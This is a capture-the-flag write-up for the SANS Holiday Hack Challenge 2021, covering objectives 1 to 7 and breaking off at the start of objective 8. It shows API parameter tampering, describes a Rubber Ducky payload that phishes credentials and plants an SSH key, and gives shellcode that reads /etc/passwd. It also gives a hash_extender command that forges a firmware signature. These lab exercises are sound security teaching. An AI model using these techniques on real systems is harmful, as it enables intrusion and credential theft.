SANS HHQ 2021

# Main Objectives

## Objective 1) - KringleCon Orientation

### 1a) Talk to Jingle Ringford

Jingle will start you on your journey!

### 1b) Get your badge

Pick up your badge

### 1c) Get the wifi adapter

Pick up the wifi adapter

### 1d) Use the terminal 

Click the computer terminal

Talk to the elf at the gate. Follow their instructions and you'll get a Wifi adapter and access to KringleCon!

## Objective 2) - Where in the World is Caramel Santaigo?

***Hints from Piney Sappington***

> Coordinate Systems \
> From: Piney Sappington \
> Objective: 2) Where in the World is Caramel Santaigo? \
> Don't forget coordinate systems other than lat/long like MGRS and what3words. \
> 	
> Flask Cookies \
> From: Piney Sappington \
> Objective: 2) Where in the World is Caramel Santaigo? \
> While Flask cookies can't generally be forged without the secret, they can often be decoded and read. \
> 	
> OSINT Talk \
> From: Piney Sappington \
> Objective: 2) Where in the World is Caramel Santaigo? \
> Clay Moody is giving a talk about OSINT techniques right now! \
	

 

### Help Tangle Coalbox find a wayward elf in Santa's courtyard. Talk to Piney Sappington nearby for hints.

Opening the terminal we see the following:

	WHERE IN THE WORLD IS
	CARAMEL SANTAIGO?
	
	Welcome! In this game you will analyze clues and track an elf around the world. Put clues about your elf in your InterRink portal. Depart by sleigh once you've figured out your next stop.
	Be sure to get there by Sunday, gumshoe. Good luck!
	
	<next screen>
	
	SANTA'S CASTLE
	MONDAY, 0900
	
	Newly renovated, the castle is again host to the best holiday hacker conference in the world, KringleCon. Security specialists from around the world travel here annually to enjoy each other's company, practice skills, and learn about the latest advancements in information security.
	


Now, this game will change each time you play. The goal is to use the clues in "Investigate" to discover a location and/or identify an elf. Use the "Visit InterRink" option to filter the elves down and work out a name. When you have figured out the location you go to "depart by sleigh" and move to the next location. When you move on you'll have to do the same thing a few times before catching up to the Elf. From there use the information you've gained about the elf to identify them.

There's nothing really technically challenging here. If someone described something as 3 words than that is going to be a position on what3words. From there it's a case of using general knowledge to figure out the locations. 


## Objective 3) Thaw Frost Tower's Entrance


***Hints from Greasy GopherGuts***

	Linux Wi-Fi Commands
	From: Greasy GopherGuts
	Objective: 3) Thaw Frost Tower's Entrance
	The iwlist and iwconfig utilities are key for managing Wi-Fi from the Linux command line.
	
	Web Browsing with cURL
	From: Greasy GopherGuts
	Objective: 3) Thaw Frost Tower's Entrance
	cURL makes HTTP requests from a terminal - in Mac, Linux, and modern Windows!
	
	Adding Data to cURL requests
	From: Greasy GopherGuts
	Objective: 3) Thaw Frost Tower's Entrance
	When sending a POST request with data, add --data-binary to your curl command followed by the data you want to send.


We picked up a Wifi adapter at the gate of the con and navigating to our tools we can open a CLI for the device.

Standing outside of Frost Tower we can use out tool to find any available Wireless networks.

using iwconfig we can see that we have an interface wlan0. From there, we can use iwlist to scan for networks. My usual goto here is to use iwlist to scan on an interface and then grep for the SSID and any other relevant details. However, in this case the wireless specturm isn't very populated at all. Only 1 network can be found:

	lf@6c9ce8bc05cf:~$ iwconfig
	wlan0     IEEE 802.11  ESSID:off/any  
	          Mode:Managed  Access Point: Not-Associated   Tx-Power=22 dBm   
	          Retry:off   RTS thr:off   Fragment thr=7 B   
	          Power Management:on
	          
	elf@6c9ce8bc05cf:~$ iwlist wlan0 scan
	wlan0     Scan completed :
	          Cell 01 - Address: 02:4A:46:68:69:21
	                    Frequency:5.2 GHz (Channel 40)
	                    Quality=48/70  Signal level=-62 dBm  
	                    Encryption key:off
	                    Bit Rates:400 Mb/s
	                    ESSID:"FROST-Nidus-Setup"
	
	elf@6c9ce8bc05cf:~$

So we have a network called "FROST-Nidus-Setup". We can join this using iwconfig. The syntax for this is something I can never remember but a quick look at the iwconfig man page will tell us what we need.

	elf@6c9ce8bc05cf:~$ iwconfig wlan0 essid "FROST-Nidus-Setup"
	** New network connection to Nidus Thermostat detected! Visit http://nidus-setup:8080/ to complete setup
	(The setup is compatible with the 'curl' utility)
	elf@6c9ce8bc05cf:~$

Awesome! Lets visit that URL and see if we have a way to control the Thermostat (apparently that's what we're going to be dealing with) and unfreeze the door.

	elf@6c9ce8bc05cf:~$ curl http://nidus-setup:8080/
	◈──────────────────────────────────────────────────────────────────────────────◈
	
	Nidus Thermostat Setup
	
	◈──────────────────────────────────────────────────────────────────────────────◈
	
	WARNING Your Nidus Thermostat is not currently configured! Access to this
	device is restricted until you register your thermostat » /register. Once you
	have completed registration, the device will be fully activated.
	
	In the meantime, Due to North Pole Health and Safety regulations
	42 N.P.H.S 2600(h)(0) - frostbite protection, you may adjust the temperature.
	
	API
	
	The API for your Nidus Thermostat is located at http://nidus-setup:8080/apidoc
	elf@6c9ce8bc05cf:~$

Ok, so we have some API docs to help interact with the device. It also says that access is restricted until we register, so maybe we should do that first.

	◈──────────────────────────────────────────────────────────────────────────────◈
	
	Nidus Thermostat Registration
	
	◈──────────────────────────────────────────────────────────────────────────────◈
	
	Welcome to the Nidus Thermostat registration! Simply enter your serial number
	below to get started. You can find the serial number on the back of your
	Nidus Thermostat as shown below:
	
	+------------------------------------------------------------------------------+
	|                                                                              |
	|                                                                              |
	|                              ....'''''''''''''...                            |
	|                         .'''...  ...............',,,'.                       |
	|                     .''.        ........''',,,;;;;,'.',,'.                   |
	|                  .,'.                   ......'',;;;;;;,.',;.                |
	|                ',.l.                          ....'',;:::;:xl:,              |
	|              ,,.                                  ....',;:cl:,,::            |
	|            .,,                      ,::::,           ....';:cc:;cx,          |
	|          .'  .                     :dkkkkd;             ...';:ccdc.;.        |
	|         ..                                                ...';::c;.,'       |
	|        '.                                                  ...';:c:;'.;      |
	|       .                                                      ...,;::;,.;     |
	|      ..                          ....'.'.'.''                 ...';::;'.,    |
	|      .                          .. ';'.'..,..                  ...,;::;.;.   |
	|     '                                ..  .. .                   ...,::;,.c   |
	|     .                                                           ...';::;';.  |
	|    '                                                             ...,;:;,.;  |
	|    ,                              ...........                    ...,;:;;.c  |
	|    ,      ...                     .  .....  .                   .;:l:;::;.l  |
	|    ;      .x.                     ....   ....                   .:ccc;:;;.l  |
	|    ,      ...                     ......... .                   ...',;;;,.c  |
	|    '.                             ...... . ..                    ...,;;;'.,  |
	|     ;                             .  .   ....                   ...',;;,.:   |
	|     ;                             ...........                  ....',;,'.;   |
	|      :                                                        ....',,,'.c    |
	|      .,              ----->       xx.x..x.x.x                .....',,'.:.    |
	|       ''                                                    .....',,'.:.     |
	|        ',                ......'';oxxxxxxdc.              ......''''.:.      |
	|         .:               ....'ldlx00KKKKXXXd.l;         ......',''..:.       |
	|           ;,'              ...,;coO0000KKKO:...       .......',;lc:;         |
	|            .l;                ....,;;;;;,'....... .........'''.'ol.          |
	|              'o;..                .......................'',''lo.            |
	|                .:o.                     ..................'kdc.              |
	|                  .,c;.                     .............,cc'                 |
	|                      ':c:'.              ..........';cc:.                    |
	|                          .;ccc:;,'.........',;:cllc,.                        |
	|                               ...,;;::::::;,'..                              |
	|                                                                              |
	|                                                                              |
	|                                                                              |
	|                                                                              |
	+------------------------------------------------------------------------------+
	
	
	
	  Serial Number: ______________________
	
	
	             +------------+
	             |   Submit   |
	             +------------+
	
	elf@6c9ce8bc05cf:~$


Interesting... We don't have the serial number and we don't have physical access to the device to get it.

Lets look at the API Docs:

	elf@6c9ce8bc05cf:~$ curl http://nidus-setup:8080/apidoc
	◈──────────────────────────────────────────────────────────────────────────────◈
	
	Nidus Thermostat API
	
	◈──────────────────────────────────────────────────────────────────────────────◈
	
	The API endpoints are accessed via:
	
	http://nidus-setup:8080/api/<endpoint>
	
	Utilize a GET request to query information; for example, you can check the
	temperatures set on your cooler with:
	
	curl -XGET http://nidus-setup:8080/api/cooler
	
	Utilize a POST request with a JSON payload to configuration information; for
	example, you can change the temperature on your cooler using:
	
	curl -XPOST -H 'Content-Type: application/json' \
	  --data-binary '{"temperature": -40}' \
	  http://nidus-setup:8080/api/cooler
	
	
	● WARNING: DO NOT SET THE TEMPERATURE ABOVE 0! That might melt important furniture
	
	Available endpoints
	
	┌─────────────────────────────┬────────────────────────────────┐
	│ Path                        │ Available without registering? │ 
	├─────────────────────────────┼────────────────────────────────┤
	│ /api/cooler                 │ Yes                            │ 
	├─────────────────────────────┼────────────────────────────────┤
	│ /api/hot-ice-tank           │ No                             │ 
	├─────────────────────────────┼────────────────────────────────┤
	│ /api/snow-shower            │ No                             │ 
	├─────────────────────────────┼────────────────────────────────┤
	│ /api/melted-ice-maker       │ No                             │ 
	├─────────────────────────────┼────────────────────────────────┤
	│ /api/frozen-cocoa-dispenser │ No                             │ 
	├─────────────────────────────┼────────────────────────────────┤
	│ /api/toilet-seat-cooler     │ No                             │ 
	├─────────────────────────────┼────────────────────────────────┤
	│ /api/server-room-warmer     │ No                             │ 
	└─────────────────────────────┴────────────────────────────────┘
	elf@6c9ce8bc05cf:~$


So it looks like we will need to register to use most of the API. We're given some curl examples for interacting with the API and it looks fairly regular. It also looks like the registration is something that's activated server-side and we don't need to pass any cookies or anything.

There's also a warning now to set the temperature above 0 degrees as "that might melt important furniture". Cool, lets do that!

We'll try the API endpoint that we do have access to first:

	elf@192942c3f612:~$ curl http://nidus-setup:8080/api/cooler
		{
		  "temperature": -39.0,
		  "humidity": 48.57,
		  "wind": 27.83,
		  "windchill": -56.81
		}

Sending a get request to this endpoint gives us some data regarding the current temperature settings.

Now based off the example in the API docs it looks like we might actaully just be able to post some data to this endpoint and change the temperature. Perhaps we don;t need to worry about registering the device right now.

Using the exact command we can actually set the temperature. I set it to 5 degrees and that seems to work for us!

	elf@192942c3f612:~$ curl -X POST -H 'Content-Type: application/json'   --data-binary '{"temperature": 5}'   http://nidus-setup:8080/api/cooler 
	{
	  "temperature": 5.93,
	  "humidity": 49.33,
	  "wind": 27.97,
	  "windchill": 1.44,
	  "WARNING": "ICE MELT DETECTED!"
	}
	
	elf@192942c3f612:~$

Awesome!

## Objective 4) Slot Machine Investigation

***Hints from Noel Boetie***

	Intercepting Proxies \
	From: Noel Boetie \
	Objective: 4) Slot Machine Investigation \
	Web application testers can use tools like Burp Suite or even right in the browser with > Firefox's Edit and Resend feature. 
	
	Parameter Tampering \
	From: Noel Boetie \
	Objective: 4) Slot Machine Investigation \
	It seems they're susceptible to parameter tampering.
	
Our first challenge with a difficulty rating of two christmas trees!

> Test the security of Jack Frost's slot machines. What does the Jack Frost Tower casino security team threaten to do when your coin total exceeds 1000? Submit the string in the server data.response element. Talk to Noel Boetie outside Santa's Castle for help.

Hubris Selfington is waiting beside the slot machiens in Jacks Casino. Apparently there may be an issue with one of the slot machines. It seems to be paying out too much money. Clicking on the slot machine will redirect usa to a new site. The same site is given to us in the objective description.

The link given here is: https://slots.jackfrosttower.com/ 

Opening the URL we can see a web page with a button. Clicking the button will load a game on the same page. The game is a kind of slot machine.

Looking at the page source we can see the following:

	<script>
	    var rootUrl = "https://slots.jackfrosttower.com/api/v1/";
	    var gameLocation = "https://slots.jackfrosttower.com/uploads/games/";
	    $(document).ready(function() {
	        $(document).on("click", ".play", function() {
	            var id = $(this).data("id");
	            var folder = $(this).data("folder");
	            if (folder !='') {
	                var url = rootUrl +id + "/session";
	                $.get( url, function( data ) {
	                    // console.log('data',data);
	                    if (data.success) {
	                        localStorage.setItem('token', data.data.session_id);
	                        var gamePath = gameLocation + folder + '/index.html';
	                        document.getElementById('gameSrc').src = gamePath;
	                        $('#playFullscreen').modal('show');
	                        // console.log('gamePath',gamePath);
	                    }
	                });
	            }else{
	                alert('Game source is not found!');
	            }
	        });
	
	        $('#playFullscreen').on('hidden.bs.modal', function () {
	            document.getElementById('gameSrc').src = 'about:blank';
	        });        
	    });
	</script>

From the above we get two URLs:

Some API endpoint: https://slots.jackfrosttower.com/api/v1/

The game location?: https://slots.jackfrosttower.com/uploads/games/


I used OWASP ZAP to intercept the requests and responses. After messing around with things a bit it became apparent that the server was handling the amount of credit, etc. Editing the responses would cause the client to display the modified data but the actual value of credits/winnings wouldn't change. The server was still managing these. 

So I started messing around with the request data. After a bit of playing I discovered that sending a negative number in the cpl field always resulted in more credits. -1000 seemed to be the maximum (or minumim) you could set it to. I used this request to start acumalatung credits:

	betamount=10&numline=20&cpl=-1000 


After a few requests I was able to build the credits up beyond 1000, and then the following response started to appear:


	{"success":true,"data":{"credit":840560,"jackpot":0,"free_spin":0,"free_num":0,"scaler":0,"num_line":20,"bet_amount":10,"pull":{"WinAmount":-30000,"FreeSpin":0,"WildFixedIcons":[],"HasJackpot":false,"HasScatter":false,"WildColumIcon":"","ScatterPrize":0,"SlotIcons":["scatter","icon5","icon8","icon9","icon5","icon9","icon10","icon2","icon6","icon6","icon8","icon8","scatter","icon6","wild"],"ActiveIcons":[11,12,3],"ActiveLines":[19]},"response":"I'm going to have some bouncer trolls bounce you right out of this casino!"},"message":"Spin success"}

In the above we can see a string message that looks like it might be the flag that we want!

## Objective 5) Strange USB Device

***Hints from Jewel Loggins***

	Ducky Script
	From: Jewel Loggins
	Objective: 5) Strange USB Device
	Ducky Script is the language for the USB Rubber Ducky
	
	Duck Encoder
	From: Jewel Loggins
	Objective: 5) Strange USB Device
	Attackers can encode Ducky Script using a duck encoder for delivery as inject.bin.
	
	Ducky RE with Mallard
	From: Jewel Loggins
	Objective: 5) Strange USB Device
	It's also possible the reverse engineer encoded Ducky Script using Mallard.
	
	Mitre ATT&CK™ and Ducky
	From: Jewel Loggins
	Objective: 5) Strange USB Device
	The MITRE ATT&CK™ tactic T1098.004 describes SSH persistence techniques through authorized keys files.
	
Morcel Nougat in the speaker unpreparedness room.

A troll has left a USB device in thei Cranberry Pi. From the hints it seems like this might be a USB Rubber Ducky.

The device in /mnt/USBDEVICE/ has a fine inject.bin.

This file, going my personal knowledge and the hints, is the file that contains the Rubber Ducky payload.

The tool Mallard is sitting in the homst directory.

We find a few items in the decoded ducky script:

A URL that the trolls seem to be posting the username and password of the user to: http://trollfun.jackfrosttower.com:1337/
(These details are being collected through a bit of a phishing attack)

We also find a longer command with what looks to be a reversed base64 encoded string being piped into bash.

If we run the command without piping it to bash we can see what it says. 

The command inserts an SSH key into the authorized keys for user ickymcgoop@trollfun.jackfrosttower.com


## Objective 6) Shellcode Primer


***Hints from Chimney Scissorsticks***

> Shellcode Primer Primer
> From: Chimney Scissorsticks
> Objective: 6) Shellcode Primer
> If you run into any shellcode primers at the North Pole, be sure to read the directions and the comments in the shellcode source!
> 
> Debugging Shellcode
> From: Chimney Scissorsticks
> Objective: 6) Shellcode Primer
> Also, troubleshooting shellcode can be difficult. Use the debugger step-by-step feature to watch values.
> 
> Register Stomping
> From: Chimney Scissorsticks
> Objective: 6) Shellcode Primer
> Lastly, be careful not to overwrite any register values you need to reference later on in your shellcode.


This challenge takes place on https://tracer.kringlecastle.com/

1. Introduction
This tasks shows you some sample code. You can run the assemblr and view the output/changes to the stack as it runs. Neat!

2. Loops
This shows how loops work. A value is put into a register. A function is defined. The function decrements the contents of the register. A jnz call calls the function until the register value is 0.

3. Getting Started
Now we're writing some code! For this we just need to add a return statement:

	; This is a comment! We'll use comments to help guide your journey.
	; Right now, we just need to RETurn!
	;
	; Enter a return statement below and hit Execute to see what happens!
	ret ; We have added this

4. Returning a Value
Here we just need to give the rax register a value:
	; TODO: Set rax to 1337
	
	mov rax, 1337 ; We have added this
	
	; Return, just like we did last time
	ret

5. System Calls
Here we're going to be executing a system call. We need to load the number associated with the function we want to call into rax and then use the other registers to pass in parameters to the functions.

	; TODO: Find the syscall number for sys_exit and put it in rax
	
	mov rax, 60 ; We have added this
	
	; TODO: Put the exit_code we want (99) in rdi
	
	mov rdi, 99 ; We have added this
	
	; Perform the actual syscall
	syscall

6. Calling Into the Void
We're going to crash the shellcode on purpose! This is madness!

	; Push this value to the stack
	push 0x12345678
	
	; Try to return
	ret

7. Getting RIP
For this we need to use the fact that we can control the stack to do some interesting things, namley access the value of the instruction pointer (rip).

	; Remember, this call pushes the return address to the stack
	call place_below_the_nop
	
	; This is where the function *thinks* it is supposed to return
	nop
	
	; This is a 'label' - as far as the call knows, this is the start of a function
	place_below_the_nop:
	
	; TODO: Pop the top of the stack into rax
	
	pop rax ; We have added this
	
	; Return from our code, as in previous levels
	ret

8. Hello, World!
For this we need to modify the code to add a label, or function, which pops the value on the stack into rax. This is actually done in the introduction and we can follow that code to implement this.

	
	; This would be a good place for a call
	
	; This is the literal string 'Hello World', null terminated, as code. Except
	; it'll crash if it actually tries to run, so we'd better jump over it!
	call getstring 	; We have added this
	db 'Hello World',0
		
	; This would be a good place for a label and a pop
	getstring: 		; We have added this
	pop rax 			; We have added this
	; This would be a good place for a re... oh wait, it's already here. Hooray!
	ret
	
	

9. Hello, World!!
Now we need to print the Hello, World! string to stdout using the sys_write function.

I may have gotten the value into rsi a weird way? Is there a better way to do this?

	; TODO: Get a reference to this string into the correct register
	
	call getstring ; We have added this
	  db 'Hello World!',0
	
	getstring:
	  pop rsi
	
	; Set up a call to sys_write
	; TODO: Set rax to the correct syscall number for sys_write
	
	mov rax, 1 ; We have added this
	
	; TODO: Set rdi to the first argument (the file descriptor, 1)
	
	mov rdi, 1 ; We have added this
	
	; TODO: Set rsi to the second argument (buf - this is the "Hello World" string)
	
	; TODO: Set rdx to the third argument (length of the string, in bytes)
	
	mov rdx, 12 ; We have added this
	
	; Perform the syscall
	syscall
	
	; Return cleanly
	ret


10. Opening a File
So for this we need to use the sys_open function to open the /etc/passwd file 

Did this similar to above. 
	
	; TODO: Get a reference to this string into the correct register
	call getstring ; We have added this
	db '/etc/passwd',0
	getstring: ; We have added this
	pop rdi ; We have added this
	
	; Set up a call to sys_open
	; TODO: Set rax to the correct syscall number
	
	mov rax, 2
	
	; TODO: Set rdi to the first argument (the filename)
	
	; TODO: Set rsi to the second argument (flags - 0 is fine)
	
	mov rsi, 0
	
	; TODO: Set rdx to the third argument (mode - 0 is also fine)
	
	mov rdx, 0
	
	; Perform the syscall
	syscall
	
	; syscall sets rax to the file handle, so to return the file handle we don't
	; need to do anything else!
	ret
	
	

11. Reading a File

For this we need to use what we've learned to open a file, read the file contents, and send that to stdout.

This was helpful: https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3

My solution for this was the following:
		
	; Open the file
	call getstring ; We have added this
	db '/var/northpolesecrets.txt',0
	getstring: 
	pop rdi 
	mov rax, 2
	mov rsi, 0
	mov rdx, 0
	syscall
	
	; Read the file
	push rdi
	push rax
	mov rax, 0
	pop rdi
	pop rsi
	mov rdx, 70
	syscall
	
	; Read more of the file
	mov rax, 0
	mov rdx, 70
	syscall
	
	
	; Write the file
	mov rax, 1
	mov rdi, 1
	mov rdx, 70
	syscall
	
	ret
	
	


This solution is hacky as hell. I ended up just wanting to get the piece of the string we need. I shouldf have been able to adjust the pointer each time s it wouldn't overwrite the previously read data, but we don't really need to worry about that. This solution doesn't exit cleanly but will end up printing the flag of "cyber security knowledge", or at least this is the part of the file contents we need to enter into the objective on our badge.

## Objective 7) Printer Exploitation

Investigate the stolen Kringle Castle printer. Get shell access to read the contents of /var/spool/printer.log. What is the name of the last file printed (with a .xlsx extension)? Find Ruby Cyster in Jack's office for help with this objective.

Available at: https://printer.kringlecastle.com/

Looking around we can see that a good few menu items are hidden being a password prompt. 

Entering something in the password field and submitting it will result in the system telling us that the login is disabled.

We can also find a firmware update page, which also allows us to download the current firmware. 

So! Either we can possably replace this with our own firmware.

We download a JSON file with some fields:

1. Firmware - base64 data, probably encoding a binary?
2. Signiture - Probably a signature (hash) for that binary?
3. secret_length - Not sure. Not the length of the signature so it must be something else
4. algorithm - Probably the hashing algorithm used to generate the signature

Lets take a look at the base64.

I used base64 -d to decode the base64 and redirected the output into a file called "firmware". 

Then used file on the new file to see what it is. File reports that it's a zip file so I unzip it. We have a .bin file called "firmware.bin". Run this and it will output "Firmware is fully up to date!". We can use file on this binary to get more information about it.

	root@kali:~/sans_hhq_2021# file firmware 
	firmware: Zip archive data, at least v2.0 to extract, compression method=deflate
	root@kali:~/sans_hhq_2021# unzip firmware 
	Archive:  firmware
	  inflating: firmware.bin            
	root@kali:~/sans_hhq_2021# ./firmware.bin 
	Firmware is fully up to date!
	root@kali:~/sans_hhq_2021# file firmware.bin 
	firmware.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fc77960dcdd5219c01440f1043b35a0ef0cce3e2, not stripped
	root@kali:~/sans_hhq_2021# 

Now the question is, should we replace this firmware with our own binary that gives us remote access OR can we modify this binary to enable the login and set our own password?

Lets explore binary more in ghidra and see if we could recover the password and enable the login. 

Looking at the binary we can see that the main function just calls puts to print out the "Firmware is fully up to date!" string.

	undefined8 main(void)
	
	{
	  puts("Firmware is fully up to date!");
	  return 0;
	}

So this binary seems pretty bare-bones. There is nothing we can do here to recover and password or enable the login feature. So the direction here might be to create our own binary that'll open a reverse shell back to us and give us shell access. But I'm guessing that to do that we'll need to make sure we have a valid signiture when we upload out new firmware.

Creatign the code to give us a reverse shell is trivial, so lets take a look at the signature and make sure we understand how this works. From the JSON file, we can see that we have a hash and the algorithm specifices SHA256, so we can make the assumption that the signature is a SHA256 hash of something.

This is the signature in the file:
2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97

So lets start hashing to see if we can generate a matching signature.
> 
> Hash of the firmware.bin file:
> 7b5b0b42e25b82c053feacaf27d0559561d4d95e8a11e2f916899f5e85b2d45e
> 
> Hash of the firmware zip file:
> 1c8fb85050a36ddc206505115bd1ede59268c3ea7c7fe9d27fb499695c61851c
> 
> Hash of the base64:
> 0ef5d67ac7c38961206cc9eac482ecf750b17fde2e2e84c440f82ada3772c4c4
> 

Interesting. None of those match. Hash of the output of the firmware.bin file?

> bcd93c28a3463424ce31776583edc7ae4be28b1b3e873b2b2ee71b974793e28d

Nope.

This must be where the "secret_length" somes into play. There must be a secret, or salt, that's added whe  the signature is being generated. We have the length of this, 16, but don't have any other information. We could try bruteforcing it but that doesn't seem like it would be the correct solution here.


*More exploration*

At this stage I did return to the web UI to look around more and double check I didn't miss another solution or anything else. There doesn't seem to be anything else useful here. Anythign that might be useful is locked behind a login.

Lets run a portscan and see if there are any other services that we can interact with.

We have a bunch of different ports reported to be open:
	
	root@airbook:~# nmap -sV printer.kringlecastle.com
	Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-21 12:27 GMT
	Nmap scan report for printer.kringlecastle.com (35.227.212.142)
	Host is up (0.032s latency).
	rDNS record for 35.227.212.142: 142.212.227.35.bc.googleusercontent.com
	Not shown: 962 filtered tcp ports (no-response)
	PORT      STATE SERVICE    VERSION
	25/tcp    open  tcpwrapped
	43/tcp    open  tcpwrapped
	80/tcp    open  http
	83/tcp    open  tcpwrapped
	84/tcp    open  tcpwrapped
	85/tcp    open  tcpwrapped
	89/tcp    open  tcpwrapped
	110/tcp   open  tcpwrapped
	143/tcp   open  tcpwrapped
	443/tcp   open  ssl/https  thin
	465/tcp   open  tcpwrapped
	587/tcp   open  tcpwrapped
	700/tcp   open  tcpwrapped
	993/tcp   open  tcpwrapped
	995/tcp   open  tcpwrapped
	1084/tcp  open  tcpwrapped
	1085/tcp  open  tcpwrapped
	1089/tcp  open  tcpwrapped
	1443/tcp  open  tcpwrapped
	1935/tcp  open  tcpwrapped
	3389/tcp  open  tcpwrapped
	5222/tcp  open  tcpwrapped
	5432/tcp  open  tcpwrapped
	5900/tcp  open  tcpwrapped
	5901/tcp  open  tcpwrapped
	5999/tcp  open  tcpwrapped
	8080/tcp  open  http-proxy
	8081/tcp  open  tcpwrapped
	8085/tcp  open  tcpwrapped
	8086/tcp  open  tcpwrapped
	8088/tcp  open  tcpwrapped
	8089/tcp  open  tcpwrapped
	8090/tcp  open  tcpwrapped
	8099/tcp  open  tcpwrapped
	9100/tcp  open  jetdirect?
	9200/tcp  open  tcpwrapped
	20000/tcp open  tcpwrapped
	30000/tcp open  tcpwrapped
	
	


We have a few regognisable ports and we also have a jetdirect port. 

Lets try connecting to a random port here, say 1089.
	
	root@airbook:~# ncat printer.kringlecastle.com 1089
	eas
	fddas
	dsdfsdsfdfs
	sd
	dfdf
	dfs
	d
	d
	d
	d
	d
	d
	d
	
	ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
	
	

No response at all. There was also no respone from the jetdirect port, but maybe there might be a valid printing service running there? Or maybe these are all just distractions. We could write a script to try some banner grabbing at each port and detect any services, but for now lets return to the firmware upload as that seems like the most obvious solution.

*Back to firmware*

Ok, it occurs to me that we probably need to figure out a way around the signiture check, but we don't really even understand that check right now, so lets try a few test cases with the firmware upload to help us understand what wee're dealing with:

1. Upload firmware as is, no modification

We get a posative response:
> Firmware successfully uploaded and validated! Executing the update package in the background


2. Upload completely different file type

In this case I uploaded an image and we get an error:
> Something went wrong!
> Firmware update failed:
> 
> Failed to parse uploaded file as JSON: 809: unexpected token at '����'

It occurs to me here that there is json parsing happening in the backend. Could there be something here we can exploit?

3. Change the signiture

In this case I change a single character in the signature

As expected, we get an error:
> Something went wrong!
> Firmware update failed:
> 
> Failed to verify the signature! Make sure you are signing the data correctly: sha256(<secret> + raw_file_data)

This gives us some insight into what's happening. As previously thought, the secret is appended to the data before the signature is calculated. 

Now, we don't know the secret, so could we either 

a) inject a command or some code in as the raw_file_data above and have it executed
b) Change the length of the secret to 0. Would this cause no secret to be used in the calculation?


4. Correct signiture, change secret_length

First I change the secret length to 1

> Something went wrong!
> Firmware update failed:
> 
> Unexpected secret_length value; it must be 16

Ok, so maybe we can't change this.

Can we define two values for the secret length?

No, we get the same error message....

Completely removing the field gives us the same error.

I don't suppose we could secret the secret here, could we?

5. Add "secret" field

Adding the secret field doesn't seem to make a difference, so it must not consider this.

6. Change algorithm

For this I change the algorithm to md5 to see what would happen:

> Something went wrong!
> Firmware update failed:
> 
> Unexpected algorithm; it must be SHA256
> 

7. No signature

I completely remove the signature field:

> Something went wrong!
> Firmware update failed:
> 
> Failed to verify the signature! Make sure you are signing the data correctly: sha256(<secret> + raw_file_data)
> 

We leave it in but leave it empty:

Same error.

8. No Firmware

Leaving the firmware field empty will result in this familiar error message:

> Something went wrong!
> Firmware update failed:
> 
> Failed to verify the signature! Make sure you are signing the data correctly: sha256(<secret> + raw_file_data)


*Hmmmm*

So there's no obvious way to mess with the signature. To generate the correct signature we're going to have to have the correct secret. 

At this stage we have a few options:

- Bruteforce to get the correct signature -> No, not practical.
- Hash collision -> Same as above, not practical.
- Inject command in binary -> Can't change the firmware code without setting a valid signature.
- Recover the secret -> ...

At this stage it looks like maybe the secret might just be somewhere that we can access. There doesn't seem to be another valid option here...

*oh wait*

At this point I spoke to Ruby Cyster in the game, who points us in the direction of hash extension attacks..hmm ok!


There are 2 interesting hints here:

A link to https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks

and

> Files placed in /app/lib/public/incoming will be accessible under https://printer.kringlecastle.com/incoming/.

I should have looked at Ruby's hints earlier. From the blog post:

> An application is susceptible to a hash length extension attack if it prepends a secret value to a string, hashes it with a vulnerable algorithm, and entrusts the attacker with both the string and the hash, but not the secret. Then, the server relies on the secret to decide whether or not the data returned later is the same as the original data.

This is exactly the situation that we're in!

This is the first time I've properly looked at this attack, and it's pretty cool! The idea is that we can continue the hashing process to generate a correct hash without knowing the secret. The output of the hashing algorithm is a valid state or output it might generate during the hashing process, so the idea is to just continue the hashing process to generate a correct hash for what we're dealing with. 

The tool we can use is here: https://github.com/iagox86/hash_extender

> git clone  https://github.com/iagox86/hash_extender

First I had to install the openssl library using

> sudo apt-get install libssl-dev

Then inside in the folder for the tool just run make.


Now, I haven't done this before so there's going to be some messing around. I'm going to acssume that the signature is related to the zipped up binary and try creating my own zip and appending that to the data we have to see what happens. First I'll start with a simple program that prints something and try it.

I create a c program that prints using puts. I then zip this.

Àfter much playing around, and looking at the discord for tips, the following command worked:

./hash_extender --file ~/sans_hhq_2021/firmware --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 -l 16 -f sha256 -a `cat ~/sans_hhq_2021/bad_firmware/firmware | xxd -p -c 9999999999` --append-format hex > ~/sans_hhq_2021/payload/hash_extender_out

From here I prepared the JSON file with the relevant details to see if the file would be seen as valid before moving forward.

It worked!

Now, from here I can essentially add any c file that I want. So we have two options. Either we try for a reverse shell, in which case I'll have to prepare something to catch it. We could also send a HTTP request, like a post request somewhere with the data and log that. OR we try a lazy approach and use the information Ruby provided us with...

Ruby said that "Files placed in /app/lib/public/incoming will be accessible under https://printer.kringlecastle.com/incoming/"

So in this case we can try creating a C file to copy the file "/var/spool/printer.log" to "/app/lib/public/incoming". Now that directory doesn't actually seem to be available to us...but maybe that will change when we put a file there?

At this stage I actually decided to chance it and see if the file "printer.log" was already in that directory. I went to https://printer.kringlecastle.com/incoming/printer.log and holy smokes there's something there!

> Documents queued for printing
> =============================
> 
> Biggering.pdf
> Size Chart from https://clothing.north.pole/shop/items/TheBigMansCoat.pdf
> LowEarthOrbitFreqUsage.txt
> Best Winter Songs Ever List.doc
> Win People and Influence Friends.pdf
> Q4 Game Floor Earnings.xlsx
> Fwd: Fwd: [EXTERNAL] Re: Fwd: [EXTERNAL] LOLLLL!!!.eml
> Troll_Pay_Chart.xlsx

Is this actually it? 

Well holy smokes batman that worked! So in the end we didn't actually have to build the proper exploit at all. Did we just get lucky here? I assume the files are cleared after a certain amount of time but who knows. It worked!

Feels like cheating a bit so I might come back to this and go for the reverse shell route.

## Objective 8) Kerberoasting on an Open Fire


***Hints from Eve Snowshoes***

> From: Eve Snowshoes
> Objective: 8) Kerberoasting on an Open Fire
> Check out Chris Davis' talk and scripts on Kerberoasting and Active Directory permissions abuse.
> 
> From: Eve Snowshoes
> Objective: 8) Kerberoasting on an Open Fire
